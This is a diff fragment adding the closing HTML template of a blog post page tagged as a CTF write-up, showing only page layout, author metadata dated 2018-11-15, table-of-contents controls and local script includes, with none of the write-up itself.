+<p><a href="https://comicalt.github.io/tags/write-up/" target="_blank" rel="noopener"> write-up</a></p>
+
+</div>
+
+
+  <div class="book-comments">
+    
+
+
+
+
+  </div>
+
+
+
+<script src="/js/book-post.js"></script>
+
+        </div>
+      </div>
+      <div class="column col-2 hide-lg">
+        <div class="book-post-info">
+  
+    <div class="book-post-meta">
+
+  <div class="author">
+
+    <!-- Author image -->
+    <div class="author-img">
+      
+        <figure class="avatar avatar-lg">
+          <img src="/avater.jpg" alt="...">
+        </figure>
+      
+    </div>
+
+    <!-- Author title -->
+    <div class="author-title">
+      <div>comical</div>
+      <div>2018-11-15</div>
+    </div>
+  </div>
+
+  
+    <div class="divider"></div>
+
+    <div class="link">
+      <a class="category-link" href="/categories/ctf-awd/">ctf+awd</a>
+
+      <a class="tag-link" href="/tags/ctf/" rel="tag">#ctf</a>
+    </div>
+    
+  
+
+  <div class="divider"></div>
+</div>
+  
+
+  <div class="book-tocbot">
+</div>
+<div class="book-tocbot-menu">
+  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+  <a onclick="go_top()">Back to top</a>
+  <a onclick="go_bottom()">Go to bottom</a>
+</div>
+
+
+<script src="/js/book-toc.js"></script>
+
+</div>
+      </div>
+    </div>
+  </div>
+  
+  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
+</div>
+
+</body>
+</html>
+
+
+<script src="/js/book.js"></script>
